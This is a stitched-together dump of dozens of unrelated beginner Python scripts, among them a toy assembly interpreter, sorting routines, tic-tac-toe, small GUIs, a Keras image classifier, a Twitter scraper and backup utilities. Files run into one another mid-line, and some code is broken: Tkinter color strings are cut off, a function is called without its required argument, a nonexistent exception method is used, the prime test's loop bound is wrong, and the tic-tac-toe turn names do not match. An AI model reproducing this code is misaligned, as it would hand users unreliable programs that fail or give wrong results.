                            zeroFlag = True
                        else:
                            zeroFlag = False
                    elif tmpToken.token == "ebx":
                        if ebx == ebx:
                            zeroFlag = True
                        else:
                            zeroFlag = False
                    elif tmpToken.token == "ecx":
                        if ebx == ecx:
                            zeroFlag = True
                        else:
                            zeroFlag = False
                    elif tmpToken.token == "edx":
                        if ebx == edx:
                            zeroFlag = True
                        else:
                            zeroFlag = False
                elif token.token == "ecx":
                    if tmpToken.token == "eax":
                        if ecx == eax:
                            zeroFlag = True
                        else:
                            zeroFlag = False
                    elif tmpToken.token == "ebx":
                        if ecx == ebx:
                            zeroFlag = True
                        else:
                            zeroFlag = False
                    elif tmpToken.token == "ecx":
                        if ecx == ecx:
                            zeroFlag = True
                        else:
                            zeroFlag = False
                    elif tmpToken.token == "edx":
                        if ecx == edx:
                            zeroFlag = True
                        else:
                            zeroFlag = False
                elif token.token == "edx":
                    if tmpToken.token == "eax":
                        if edx == eax:
                            zeroFlag = True
                        else:
                            zeroFlag = False
                    elif tmpToken.token == "ebx":
                        if edx == ebx:
                            zeroFlag = True
                        else:
                            zeroFlag = False
                    elif tmpToken.token == "ecx":
                        if edx == ecx:
                            zeroFlag = True
                        else:
                            zeroFlag = False
                    elif tmpToken.token == "edx":
                        if edx == edx:
                            zeroFlag = True
                        else:
                            zeroFlag = False
            else:
                print("Error: Not found register!")
                return
        elif token.token == "je":
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]  
            else:
                print("Error: Not found argument")
                return
            if token.t == "label":
                if zeroFlag:
                    pointer = jumps[token.token]
            else:
                print("Error: Not found label")
                return
        elif token.t == "identifier":
            if token.token not in variables:
                if pointer + 1 < len(tokens):
                    pointer += 1
                    tmpToken = tokens[pointer]  
                else:
                    print("Error: Not found argument")
                    return
                if tmpToken.t == "command" and tmpToken.token == "db":
                    if pointer + 1 < len(tokens):
                        pointer += 1
                        tmpToken = tokens[pointer]  
                    else:
                        print("Error: Not found argument")
                        return
                    if tmpToken.t == "value" or tmpToken.t == "string":
                        if tmpToken.t == "value":
                            variables[token.token] = float(tmpToken.token)
                        elif tmpToken.t == "string":
                            variables[token.token] = tmpToken.token
                else:
                    print("Error: Not found db-keyword")
                    return
        elif token.token == "call":  
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]  
            else:
                print("Error: Not found subprogram label")
                return
            if token.t == "subprogram":
                if token.token in jumps:
                    returnStack.append(pointer)  
                    pointer = jumps[token.token]
                else:  
                    print("Error: Unknow subprogram!")
                    return
            else:  
                print("Error: Not found subprogram")
                return
        elif token.token == "ret":  
            if len(returnStack) >= 1:
                pointer = returnStack.pop()
            else:  
                print("Error: No return adress on stack")
                return
        elif token.t == "subprogram":
            pass
        elif token.token == "mul":  
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]  
            else:
                print("Error: Not found argument")
                return
            if token.t == "register":
                if token.token == "eax":
                    eax *= eax
                elif token.token == "ebx":
                    eax *= ebx
                elif token.token == "ecx":
                    eax *= ecx
                elif token.token == "edx":
                    eax *= edx
            else:
                print("Error: Not found register")
                return
        elif token.token == "div":
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]  
            else:
                print("Error: Not found argument")
                return
            if token.t == "register":
                if token.token == "eax":
                    eax /= eax
                elif token.token == "ebx":
                    eax /= ebx
                elif token.token == "ecx":
                    eax /= ecx
                elif token.token == "edx":
                    eax /= edx
            else:
                print("Error: Not found register")
                return
        pointer += 1
def registerLabels():
    for i in range(len(tokens)):
        if (tokens[i].t == "label"):
            jumps[tokens[i].token] = i
        elif tokens[i].t == "subprogram":
            jumps[tokens[i].token] = i
def resetInterpreter():
    global eax, ebx, ecx, edx, zeroFlag, stack
    global variables, jumps, lines, tokens, returnStack
    eax = 0
    ebx = 0
    ecx = 0
    edx = 0
    zeroFlag = False
    stack = []
    jumps = {}
    variables = {}
    lines = []
    tokens = []
    returnStack = []
def main():
    for arg in sys.argv[1:]:
        resetInterpreter()  
        try:
            loadFile(arg)
            scan()
            registerLabels()
            parser()
        except:
            print("Error: File %s not found!" % (arg))
if __name__ == "__main__":
    main()
from __future__ import print_function
import os  
path = os.getenv("scripts")  
dropbox = os.getenv("dropbox")  
def clear_screen():  
    if os.name == "posix":  
        os.system('clear')  
    elif os.name in ("nt", "dos", "ce"):  
        os.system('CLS')  
def count_files(path,
                extensions):  
    counter = 0  
    for root, dirs, files in os.walk(path):  
        for file in files:  
            counter += file.endswith(extensions)  
    return counter  
def github():  
    github_dir = os.path.join(dropbox, 'github')  
    github_count = sum((len(f) for _, _, f in os.walk(github_dir)))  
    if github_count > 5:  
        print('\nYou have too many in here, start uploading !!!!!')
        print('You have: ' + str(github_count) + ' waiting to be uploaded to github!!')
    elif github_count == 0:  
        print('\nGithub directory is all Clear')
    else:  
        print('\nYou have: ' + str(github_count) + ' waiting to be uploaded to github!!')
def development():  
    dev_dir = os.path.join(path, 'development')  
    dev_count = sum((len(f) for _, _, f in os.walk(dev_dir)))  
    if dev_count > 10:  
        print('\nYou have too many in here, finish them or delete them !!!!!')
        print('You have: ' + str(dev_count) + ' waiting to be finished!!')
    elif dev_count == 0:  
        print('\nDevelopment directory is all clear')
    else:
        print('\nYou have: ' + str(
            dev_count) + ' waiting to be finished!!')  
clear_screen()  
print('\nYou have the following :\n')
print('AutoIT:\t' + str(
    count_files(path, '.au3')))  
print('Batch:\t' + str(count_files(path, ('.bat', ',cmd'))))  
print('Perl:\t' + str(count_files(path, '.pl')))
print('PHP:\t' + str(count_files(path, '.php')))  
print('Python:\t' + str(count_files(path, '.py')))
print('Shell:\t' + str(count_files(path, ('.ksh', '.sh', '.bash'))))
print('SQL:\t' + str(count_files(path, '.sql')))
github()  
development()  
class Teacher:
    def teachers_action(self):
        print("I can teach")
class Engineer:
    def Engineers_action(self):
        print("I can code")
class Youtuber:
    def youtubers_action(self):
        print("I can code and teach")
class Person(Teacher, Engineer, Youtuber):
    pass
coder = Person()
coder.teachers_action()
coder.Engineers_action()
coder.youtubers_action()
import xlrd
loc = ("sample.xlsx")
wb = xlrd.open_workbook(loc)
sheet = wb.sheet_by_index(0)
sheet.cell_value(0, 0)
print(sheet.nrows)
print(sheet.ncols)
for i in range(sheet.ncols):
    print(sheet.cell_value(0, i))
sheet = wb.sheet_by_index(0)
for i in range(sheet.nrows):
    print(sheet.cell_value(i, 0))
sheet = wb.sheet_by_index(0)
print(sheet.row_values(1))
from .statics import *
import pygame as pg
class pieces:
    padding = 17
    outline  = 2
    def __init__(self, row, col, color):
        self.row = row
        self.col = col
        self.color = color
        self.king = False
        self.x = self.y = 0
        self.calculate_pos()
    def calculate_pos (self):
        self.x = ((sq_size * self.col) + (sq_size // 2))
        self.y = ((sq_size * self.row) + (sq_size // 2))
    def make_king (self):
        self.king = True
    def draw (self, window):
        radd = ((sq_size // 2) - self.padding)
        pg.draw.circle(window, gray, (self.x, self.y), radd + self.outline)
        pg.draw.circle(window, self.color, (self.x, self.y), radd)
        if (self.king):
            window.blit(crown, ((self.x - crown.get_width() // 2), (self.y - crown.get_height() // 2)))
    def move (self, row, col):
        self.row = row
        self.col = col
        self.calculate_pos()
    def __repr__(self):
        return str(self.color)
import pickle
import tensorflow as tf
model = tf.keras.models.Sequential([tf.keras.layers.Conv2D(16, (3, 3), activation='relu', input_shape=(200, 200, 3)),
                                    tf.keras.layers.MaxPooling2D(2, 2),
                                    tf.keras.layers.Conv2D(16, (3, 3), activation='relu'),
                                    tf.keras.layers.MaxPooling2D(2, 2),
                                    tf.keras.layers.Conv2D(16, (3, 3), activation='relu'),
                                    tf.keras.layers.MaxPooling2D(2, 2),
                                    tf.keras.layers.Flatten(),
                                    tf.keras.layers.Dense(512, activation='relu'),
                                    tf.keras.layers.Dense(1, activation="sigmoid")
                                    ])
model.summary()
from tensorflow.keras.optimizers import RMSprop
model.compile(optimizer=RMSprop(lr=0.001), loss='binary_crossentropy', metrics=['acc'])
from tensorflow.keras.preprocessing.image import ImageDataGenerator
train_datagen = ImageDataGenerator(rescale=1 / 255)
train_generator = train_datagen.flow_from_directory('../Classification_human-or-horse',
                                                    target_size=(200, 200),
                                                    batch_size=222,
                                                    class_mode='binary')
model.fit_generator(train_generator, steps_per_epoch=6, epochs=1, verbose=1)
filename = "myTf1.sav"
pickle.dump(model, open(filename, 'wb'))
from tkinter import Tk
from tkinter.filedialog import askopenfilename
from keras.preprocessing import image
import numpy as np
Tk().withdraw()
filename = askopenfilename()
print(filename)
img = image.load_img(filename, target_size=(200, 200))
x = image.img_to_array(img)
x = np.expand_dims(x, axis=0)
images = np.vstack([x])
classes = model.predict(images, batch_size=10)
print(classes[0])
if classes[0] > 0.5:
    print(filename + " is a human")
else:
    print(filename + " is a horse")
import datetime  
import os  
import shutil  
today = datetime.date.today()  
todaystr = today.isoformat()  
confdir = os.getenv("my_config")  
dropbox = os.getenv("dropbox")  
conffile = 'services.conf'  
conffilename = os.path.join(confdir, conffile)  
sourcedir = os.path.expanduser('~/Library/Services/')  
destdir = os.path.join(dropbox, "My_backups" + "/" + "Automater_services" + todaystr + "/")
for file_name in open(conffilename):  
    fname = file_name.strip()  
    if fname:  
        sourcefile = os.path.join(sourcedir, fname)  
        destfile = os.path.join(destdir, fname)  
        shutil.copytree(sourcefile, destfile)  
def angle_type():
    angles = []
    myDict = {"All angles are less than 90°.":"Acute Angle Triangle","Has a right angle (90°)":"Right Angle Triangle",
              "Has an angle more than 90°":"Obtuse Angle triangle"}
    print("**************Enter the angles of your triangle to know it's type*********")
    angle1 = int(input("Enter angle 1 : "))
    if(angle1 < 180 and angle1 > 0):
        angles.append(angle1)
    else:
        print("Please enter a value less than 180°")
        angle1 = int(input())
        angles.append(angle1)
    angle2 = int(input("Enter angle2 : "))
    if(angle2 < 180 and angle2 > 0):
        angles.append(angle2)
    else:
        print("Please enter a value less than 180°")
        angle2 = int(input("Enter angle 2 :"))
        angles.append(angle2)
    angle3 = int(input("Enter angle3 : "))
    if(angle3 < 180 and angle3 > 0):
        angles.append(angle3)
    else:
        print("Please enter a value less than 180°")
        angle3 = int(input("Enter angle3 : "))
        angles.append(angle3)
    sum_of_angles = angle1 + angle2 +angle3
    if(sum_of_angles > 180 or sum_of_angles < 180):
        print("It is not a triangle!Please enter valid angles.")
        return -1
    print("You have entered : " +str(angles))
    if(angle1 == 90 or angle2 ==90 or angle3 == 90):
        print(myDict.get("Has a right angle (90°)"))
    elif(angle1 < 90 and angle2 < 90 and angle3 < 90):
        print(myDict.get("All angles are less than 90°."))
    elif(angle1 > 90 or angle2 > 90 or angle3 > 90):
        print(myDict.get("Has an angle more than 90°"))
angle_type()
def check(f):
    def helper(x):
        if type(x) == int and x > 0:
            return f(x)
        else:
            raise Exception("Argument is not a non-negative integer")
    return helper
def factorial(n):
    if n == 1:
        return 1
    else:
        return n * factorial(n - 1)
for i in range(1, 10):
    print(i, factorial(i))
try:
    print(factorial(-1))
except Exception as e:
    e.print_exception()
try:
    print(factorial(1.354))
except Exception as e:
    e.print_exception()
expenses = [1200,1500,1300,1700]
total = expenses[0] + expenses[1] + expenses[2] + expenses[3]
print(total)
total = 0
for expense in expenses:
    total = total + expense
print(total)
print(range(1,11))
print(list(range(1,11)))
for i in range(1,11):
    print(i)
total = 0
for i in range(len(expenses)):
    print(f"Month {i+1}, expense: {expenses[i]}")
    total += expenses[i]
print(f"Total expenses is {total}")
key_location="chair"
locations = ["sofa","garage","chair","table","closet"]
for loc in locations:
    if loc == key_location:
        print("Key found at:",loc)
        break
    else:
        print("Key not found in:",loc)
for i in range(11):
    if i%2==0:
        continue
    print(i)
num=0
while num<=10:
    print(num)
    num=num+1
import os  
import shutil  
from time import strftime  
logsdir = "c:\logs\puttylogs"  
zipdir = "c:\logs\puttylogs\zipped_logs"  
zip_program = "zip.exe"  
for files in os.listdir(logsdir):  
    if files.endswith(".log"):  
        files1 = files + "." + strftime(
            "%Y-%m-%d") + ".zip"  
        os.chdir(logsdir)  
        os.system(zip_program + " " + files1 + " " + files)  
        shutil.move(files1, zipdir)  
        os.remove(files)  
import statistics
stocks = {
    'info': [600,630,620],
    'ril': [1430,1490,1567],
    'mtl': [234,180,160]
}
def print_all():
    for stock,price_list in stocks.items():
        avg = statistics.mean(price_list)
        print(f"{stock} ==> {price_list} ==> avg: ",round(avg,2))
def add():
    s = input("Enter a stock ticker to add:")
    p = input("Enter price of this stock:")
    p=float(p)
    if s in stocks:
        stocks[s].append(p)
    else:
        stocks[s] = [p]
    print_all()
def main():
    op=input("Enter operation (print, add or amend):")
    if op.lower() == 'print':
        print_all()
    elif op.lower() == 'add':
        add()
    else:
        print("Unsupported operation:",op)
if __name__ == '__main__':
    main()
import subprocess
HOSTS = ('proxy1', 'proxy')
COMMANDS = ('uname -a', 'uptime')
for host in HOSTS:
    result = []
    for command in COMMANDS:
        ssh = subprocess.Popen(["ssh", "%s" % host, command],
                               shell=False,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        result.append(ssh.stdout.readlines())
    print('--------------- ' + host + ' --------------- ')
    for res in result:
        if not res:
            print(ssh.stderr.readlines())
            break
        else:
            print(res)
class Node:
    def __init__(self, data):
        self.data = data
        self.next = None
class Linked_List:
    def __init__(self):
        self.head = None
    def Insert_At_Beginning(self, new_data):
        new_node = Node(new_data)
        if self.head is None:
            self.head = new_node
            return
        new_node.next = self.head
        self.head = new_node
    def Rotation(self, key):
        if key == 0:
            return
        current = self.head
        count = 1
        while count < key and current is not None:
            current = current.next
            count += 1
        if current is None:
            return
        Kth_Node = current
        while current.next is not None:
            current = current.next
        current.next = self.head
        self.head = Kth_Node.next
        Kth_Node.next = None
    def Display(self):
        temp = self.head
        while(temp):
            print(temp.data, "->", end=" ")
            temp = temp.next
        print("None")
if __name__ == "__main__":
    L_list = Linked_List()
    L_list.Insert_At_Beginning(8)
    L_list.Insert_At_Beginning(5)
    L_list.Insert_At_Beginning(10)
    L_list.Insert_At_Beginning(7)
    L_list.Insert_At_Beginning(6)
    L_list.Insert_At_Beginning(11)
    L_list.Insert_At_Beginning(9)
    print("Linked List Before Rotation: ")
    L_list.Display()
    print("Linked List After Rotation: ")
    L_list.Rotation(4)
    L_list.Display()import math
while True:
    try:
        num = int(input("Enter a Number: "))
        break
    except ValueError:
        print("Invalid Input")
if num > 1:
    for i in range(2,int(math.sqrt(num))):  
        if (num % i) == 0:
            print(num,"is NOT a Prime Number. It's indeed a COMPOSITE NUMBER")
            break
    else:
        print(num,"is a PRIME NUMBER ")
else:
    print(num,"is NOT a Prime Number")
from appJar import gui
def press():
    print(p.getCheckBox('Onay'))
p = gui()
p.setSize(300,200)
p.addCheckBox('Onay')
p.addButton('Buton', press)
p.go()
__author__ = 'Craig Richards'
__version__ = '1.0'
import argparse
import os
def batch_rename(work_dir, old_ext, new_ext):
    for filename in os.listdir(work_dir):
        split_file = os.path.splitext(filename)
        root_name, file_ext = split_file
        if old_ext == file_ext:
            newfile = root_name + new_ext
            os.rename(
                os.path.join(work_dir, filename),
                os.path.join(work_dir, newfile)
            )
    print("rename is done!")
    print(os.listdir(work_dir))
def get_parser():
    parser = argparse.ArgumentParser(description='change extension of files in a working directory')
    parser.add_argument('work_dir', metavar='WORK_DIR', type=str, nargs=1,
                        help='the directory where to change extension')
    parser.add_argument('old_ext', metavar='OLD_EXT', type=str, nargs=1, help='old extension')
    parser.add_argument('new_ext', metavar='NEW_EXT', type=str, nargs=1, help='new extension')
    return parser
def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    work_dir = args['work_dir'][0]
    old_ext = args['old_ext'][0]
    if old_ext and old_ext[0] != '.':
        old_ext = '.' + old_ext
    new_ext = args['new_ext'][0]
    if new_ext and new_ext[0] != '.':
        new_ext = '.' + new_ext
    batch_rename(work_dir, old_ext, new_ext)
if __name__ == '__main__':
    main()
import random 
def introduction():
    print("Hello this a sample tic tac toe game")
    print("It will rotate turns between players one and two")
    print("While 3,3 would be the bottom right.")
    print("Player 1 is X and Player 2 is O")
def draw_board(board):
    print("    |    |")
    print("  " + board[7] + " | " + board[8] + "  | " + board[9])
    print("    |    |")
    print("-------------")
    print("    |    |")
    print("  " + board[4] + " | " + board[5] + "  | " + board[6])
    print("    |    |")
    print("-------------")
    print("    |    |")
    print("  " + board[1] + " | " + board[2] + "  | " + board[3])
    print("    |    |")
def input_player_letter():
    letter = ''
    while not (letter =='X' or letter == 'O'):
        print("Do you want to be X or O? ")
        letter = input("> ").upper()
    if letter == 'X':
        return ['X', 'O']
    else:
        return ['O', 'X']
def frist_player():
    guess = random.randint(0, 1)
    if guess == 0:
        return "Computer"
    else:
        return "Player"
def play_again():
    print("Do you want to play again? (y/n)")
    return input().lower().startswith('y')
def make_move(board, letter, move):
    board[move] = letter
def is_winner(bo, le):
    return ((bo[7] == le and bo[8] == le and bo[9] == le) or 
    (bo[4] == le and bo[5] == le and bo[6] == le) or 
    (bo[1] == le and bo[2] == le and bo[3] == le) or
    (bo[7] == le and bo[4] == le and bo[1] == le) or
    (bo[8] == le and bo[5] == le and bo[2] == le) or 
    (bo[9] == le and bo[6] == le and bo[3] == le) or 
    (bo[7] == le and bo[5] == le and bo[3] == le) or 
    (bo[9] == le and bo[5] == le and bo[1] == le))
def get_board_copy(board):
    dupe_board = []
    for i in board:
        dupe_board.append(i)
    return dupe_board
def is_space_free(board, move):
    return board[move] == ' '
def get_player_move(board):
    move = ' '
    while move not in '1 2 3 4 5 6 7 8 9'.split() or not is_space_free(board, int(move)):
        print("What is your next move? (1-9)")
        move = input()
    return int(move)
def choose_random_move_from_list(board, moveslist):
    possible_moves = [] 
    for i in moveslist:
        if is_space_free(board, i):
            possible_moves.append(i)
    if len(possible_moves) != 0:
        return random.choice(possible_moves)
    else:
        return None
def get_computer_move(board, computer_letter):
    if computer_letter == 'X':
        player_letter = 'O'
    else:
        player_letter = 'X'
    for i in range(1, 10):
        copy = get_board_copy(board)
        if is_space_free(copy, i):
            make_move(copy, computer_letter, i)
            if is_winner(copy, computer_letter):
                return i
    for i in range(1, 10):
        copy = get_board_copy(board)
        if is_space_free(copy, i):
            make_move(copy, player_letter, i)
            if is_winner(copy, player_letter):
                return i
    move = choose_random_move_from_list(board, [1, 3, 7, 9])
    if move != None:
        return move
    if is_space_free(board, 5):
        return 5
    return choose_random_move_from_list(board, [2, 4, 6, 8])
def is_board_full(board):
    for i in range(1, 10):
        if is_space_free(board, i):
            return False
    return True
print("Welcome To Tic Tac Toe!")
while True: 
    the_board = [' '] * 10
    player_letter, computer_letter = input_player_letter()
    turn = frist_player()
    print("The " + turn + " go frist.")
    game_is_playing = True
    while game_is_playing: 
        if turn == 'player':
            draw_board(the_board)
            move = get_player_move(the_board)
            make_move(the_board, player_letter, move)
            if is_winner(the_board, player_letter):
                draw_board(the_board)
                print("Hoory! You have won the game!")
                game_is_playing = False
            else:
                if is_board_full(the_board):
                    draw_board(the_board)
                    print("The game is tie!")
                    break
                else:
                    turn = 'computer'
        else:
            move = get_computer_move(the_board, computer_letter)
            make_move(the_board, computer_letter, move)
            if is_winner(the_board, computer_letter):
                draw_board(the_board)
                print("The computer has beaten you! You Lose.")
                game_is_playing = False
            else:
                if is_board_full(the_board):
                    draw_board(the_board)
                    print("The game is a tie!")
                    break
                else:
                   turn = 'player'
    if not play_again():
        break
from fixtures.mydb import MyDB
import pytest
def cur():
    print("setting up")
    db = MyDB()
    conn = db.connect("server")
    curs = conn.cursor()
    yield curs
    curs.close()
    conn.close()
    print("closing DB")
def test_johns_id(cur):
    id = cur.execute("select id from employee_db where name=John")
    assert id == 123
def test_toms_id(cur):
    id = cur.execute("select id from employee_db where name=Tom")
    assert id == 789
from difflib import get_close_matches
import pyttsx3
import json
import speech_recognition as sr
data = json.load(open('data.json'))
engine = pyttsx3.init()
voices = engine.getProperty('voices')
engine.setProperty('voice', voices[0].id)
def speak(audio):
    engine.say(audio)
    engine.runAndWait()
def takeCommand():
    r = sr.Recognizer()
    with sr.Microphone() as source:
        print('Listening...')
        r.pause_threshold = 1
        r.energy_threshold = 494
        r.adjust_for_ambient_noise(source, duration=1.5)
        audio = r.listen(source)
    try:
        print('Recognizing..')
        query = r.recognize_google(audio, language='en-in')
        print(f'User said: {query}\n')
    except Exception as e:
        print('Say that again please...')
        return 'None'
    return query
def translate(word):
    word = word.lower()
    if word in data:
        speak('Here is what I found in dictionary..')
        d = data[word]
        d = ''.join(str(e) for e in d)
        speak(d)
    elif len(get_close_matches(word, data.keys())) > 0:
        x = get_close_matches(word, data.keys())[0]
        speak('Did you mean ' + x +
              ' instead,  respond with Yes or No.')
        ans = takeCommand().lower()
        if 'yes' in ans:
            speak('ok ' + 'It means..' + data[x])
        elif 'no' in ans:
            speak("Word doesn't exist. Please make sure you spelled it correctly.")
        else:
            speak("We didn't understand your entry.")
    else:
        speak("Word doesn't exist. Please double check it.")
if __name__ == '__main__':
    translate()
arr = [7, 2, 8, 5, 1, 4, 6, 3];     
temp = 0;    
print("Elements of original array: ");    
for i in range(0, len(arr)):    
    print(arr[i], end=" ");    
for i in range(0, len(arr)):    
    for j in range(i+1, len(arr)):    
        if(arr[i] > arr[j]):    
            temp = arr[i];    
            arr[i] = arr[j];    
            arr[j] = temp;    
;    
print("Elements of array sorted in ascending order: ");    
for i in range(0, len(arr)):    
    print(arr[i], end=" ");    
list = []  
def input_list():
    n = int(input("Enter number of elements in the list: "))  
    for i in range(n):
        temp = int(input("Enter element " + str(i + 1) + ': '))
        list.append( temp )
def insertion_sort(list,n):
    for i in range(0,n):
        key = list[i]
        j = i - 1
        while j >= 0 and list[j] > key:
            list[j + 1] = list[j]
            j = j - 1
        list[j + 1] = key 
    return list
def insertion_sort_desc(list,n):
    for i in range(0,n):
        key = list[i]
        j = i - 1
        while j >= 0 and list[j] < key:
            list[j + 1] = list[j]
            j = j - 1
        list[j + 1] = key
    return list  
input_list()
list1=insertion_sort(list,len(list))
print(list1)
list2=insertion_sort_desc(list,len(list))
print(list2)
import time
print("Hello I'm Geek! Let's Execute Your Code!")
time.sleep(1)
print("Starting Our Code!")
time.sleep(1)
print("Always Remember Python Is Case Sensitive!")
time.sleep(1)
print("Here We Go!")
time.sleep(1)
print("Hello World!")
time.sleep(1)
print("A Quick Tip!")
time.sleep(1)
print("make sure to use the same type of quotes(quotation marks or apostrophes)at the end that you used at the start")
time.sleep(2)
print("All The Best!")
from utility import area
print(area.area_circle(3))
import os
import random
players=[]
score=[]
print("\n\tRandom Number Game\n\nHello Everyone ! it is just a game of chance in which you have to guess a number"
      " from 0 to 100 and computer will tell whether your guess is smaller or bigger than the acctual number chossen by the computer . "
      "the person with less attempts in guessing the number will be winner .")
x=input()
os.system('cls')
n=int(input("Enter number of players : "))
for i in range(0,n):
    name=input("Enter name of player : ")
    players.append(name)
os.system('cls')
for i in range(0,n):
    orignum=random.randint(1,100)
    print(players[i],"your turn :",end="\n\n")
    count=0
    while True :
        ch=int(input("Please enter your guess : "))
        if ch>orignum:
            print("no! number is smaller...")
            count+=1
        elif ch==orignum:
            print("\n\n\tcongrats you won")
            break
        else :
            print("nope ! number is large dude...")
            count+=1
    print("    you have taken", count+1,"attempts")
    x=input()
    score.append(count+1)
    os.system('cls')
print("players :\n")
for i in range(0,n):
    print(players[i],"-",score[i])
print("\n\nwinner is :\n")
for i in range(0,n):
    if score[i]==min(score):
        print(players[i])
x=input()
class Animal:
    def __init__(self, habitat):
        self.habitat = habitat
    def print_habitat(self):
        print(self.habitat)
    def sound(self):
        print("Some Animal Sound")
class Dog(Animal):
    def __init__(self):
        super().__init__("Kennel")
    def sound(self):
        print("Woof woof!")
x = Dog()
x.print_habitat()
x.sound()
a=True
while a==True:
    number1=int(input("enter first number:"))
    number2=int(input("enter second number:"))
    number3=int(input("enter third number:"))
    sum=number1+number2+number3
    print("\t\t======================================")
    print("Addition of three numbers is"," :-- ",sum)
    print("\t\t======================================")
    d=input("Do tou want to do it again ??   Y / N -- ").lower()
    if d=='y':
        print("\t\t======================================")
        continue
    else:
        exit()
word_stats={}
with open("poem.txt","r") as f:
    for line in f:
      words=line.split(' ')
      for word in words:
        if word in word_stats:
          word_stats[word]+=1
        else:
          word_stats[word] = 1
print(word_stats)
word_occurances = list(word_stats.values())
max_count = max(word_occurances)
print("Max occurances of any word is:",max_count)
print("Words with max occurances are: ")
for word, count in word_stats.items():
    if count==max_count:
        print(word)
from appJar import gui
p = gui()
p.setSize(300,200)
p.addLabel('Merhaba')
p.go()def print_pattern(n=5):
    for i in range(n):
        s = ''
        for j in range(i+1):
            s = s + '*'
        print(s)
def calculate_area(dimension1,dimension2,shape="triangle"):
    if shape=="triangle":
        area=1/2*(dimension1*dimension2) 
    elif shape=="rectangle":
        area=dimension1*dimension2 
    else:
        print("Error: Input shape is neither triangle nor rectangle.")
        area=None 
    return area
base=10
height=5
triangle_area=calculate_area(base,height,"triangle")
print("Area of triangle is:",triangle_area)
length=20
width=30
rectangle_area=calculate_area(length,width,"rectangle")
print("Area of rectangle is:",rectangle_area)
triangle_area=calculate_area(base,height) 
print("Area of triangle with no shape supplied: ",triangle_area)
print("Print pattern with input=3")
print_pattern(3)
print("Print pattern with input=4")
print_pattern(4)
print("Print pattern with no input number")
print_pattern() 
from appJar import gui
def press():
    sayi = p.floatBox('Sayı penceresi', 'Mesaj', parent=None)
    print(sayi)
p = gui()
p.setSize(300,200)
p.addButton('Buton', press)
p.go()import requests
from bs4 import BeautifulSoup
import re
re_text = r'\:|\.|\!|(https|http)?:\/\/(\w|\.|\/|\?|\=|\&|\%)*\b|(.twitter.com\/)\w*|\&'
re_text_1 = r'(pictwittercom)\/\w*'
def tweeter_scrapper():
    list_of_dirty_tweets = []
    clear_list_of_tweets = []
    base_tweeter_url = 'https://twitter.com/{}'
    tweeter_id = input()
    response = requests.get(base_tweeter_url.format(tweeter_id))
    soup = BeautifulSoup(response.content , 'lxml')
    all_tweets = soup.find_all('div',{'class':'tweet'})
    for tweet in all_tweets:
        content = tweet.find('div',{'class':'content'})
        message = content.find('div',{'class':'js-tweet-text-container'}).text.replace("\n"," ").strip()
        list_of_dirty_tweets.append(message)
    for dirty_tweet in list_of_dirty_tweets:
        dirty_tweet = re.sub(re_text, '', dirty_tweet, flags=re.MULTILINE)
        dirty_tweet = re.sub(re_text_1, '', dirty_tweet, flags=re.MULTILINE)
        dirty_tweet = dirty_tweet.replace(u'\xa0…', u'')
        dirty_tweet = dirty_tweet.replace(u'\xa0', u'')
        dirty_tweet = dirty_tweet.replace(u'\u200c', u'')
        clear_list_of_tweets.append(dirty_tweet)
    print(clear_list_of_tweets)
if __name__ == "__main__":
    tweeter_scrapper()from PIL import Image
import os
class image2pdf:
    def __init__(self):
        self.validFormats = (
            '.jpg',
            '.jpeg',
            '.png',
            '.JPG',
            '.PNG'
        )
        self.pictures = []
        self.files = os.listdir()
        self.convertPictures()
        input('Done ..... (Press Any Key To Exit)')
    def filter(self, item):
        return item.endswith(self.validFormats)
    def sortFiles(self):
        return sorted(self.files)
    def getPictures(self):
        pictures = list(filter(self.filter, self.sortFiles()))
        if self.isEmpty(pictures):
        	print(" [Error] there are no pictrues in the directory ! ")
        	raise Exception(" [Error] there are no pictrues in the directory !")
        print('pictures are : \n {}'.format(pictures))
        return pictures
    def isEmpty(self, items):
    	return True if len(items) == 0 else False
    def convertPictures(self):
        for picture in self.getPictures():
            self.pictures.append(Image.open(picture).convert('RGB'))
        self.save()
    def save(self):
        self.pictures[0].save('result.pdf', save_all=True, append_images=self.pictures[1:])
if __name__ == "__main__":
    image2pdf()
from sys import maxsize 
def createStack(): 
	stack = [] 
	return stack 
def isEmpty(stack): 
	return len(stack) == 0
def push(stack, item): 
	stack.append(item) 
	print(item + " pushed to stack ") 
def pop(stack): 
	if (isEmpty(stack)): 
		return str(-maxsize -1) 
	return stack.pop() 
def peek(stack): 
	if (isEmpty(stack)): 
		return str(-maxsize -1) 
	return stack[len(stack) - 1] 
stack = createStack() 
push(stack, str(10)) 
push(stack, str(20)) 
push(stack, str(30)) 
print(pop(stack) + " popped from stack") 
def heapify(nums, heap_size, root_index):
    largest = root_index
    left_child = (2 * root_index) + 1
    right_child = (2 * root_index) + 2
    if left_child < heap_size and nums[left_child] > nums[largest]:
        largest = left_child
    if right_child < heap_size and nums[right_child] > nums[largest]:
        largest = right_child
    if largest != root_index:
        nums[root_index], nums[largest] = nums[largest], nums[root_index]
        heapify(nums, heap_size, largest)
def heap_sort(nums):
    n = len(nums)
    for i in range(n, -1, -1):
        heapify(nums, n, i)
    for i in range(n - 1, 0, -1):
        nums[i], nums[0] = nums[0], nums[i]
        heapify(nums, i, 0)
random_list_of_nums = [35, 12, 43, 8, 51]
heap_sort(random_list_of_nums)
print(random_list_of_nums)
try:
    from Tkinter import *
except ImportError:
    from tkinter import *
try:
    import ttk
    py3 = 0
except ImportError:
    import tkinter.ttk as ttk
    py3 = 1
import notepad_support
def vp_start_gui():
    global w, w_win, rt
    rt = root
    w = Toplevel(root)
    top = Notepads_managment(w)
    notepad_support.init(w, top, *args, **kwargs)
    return (w, top)
def destroy_Notepads_managment():
    global w
    w.destroy()
    w = None
class Notepads_managment:
    def __init__(self, top=None):
        _bgcolor = '
        _fgcolor = '
        _compcolor = '
        _ana1color = '
        _ana2color = '
        self.style = ttk.Style()
        if sys.platform == "win32":
            self.style.theme_use('winnative')
        self.style.configure('.', background=_bgcolor)
        self.style.configure('.', foreground=_fgcolor)
        self.style.configure('.', font="TkDefaultFont")
        self.style.map('.', background=
        [('selected', _compcolor), ('active', _ana2color)])
        top.geometry("600x450")
        top.title("Notepads managment")
        top.configure(highlightcolor="black")
        self.style.configure('TNotebook.Tab', background=_bgcolor)
        self.style.configure('TNotebook.Tab', foreground=_fgcolor)
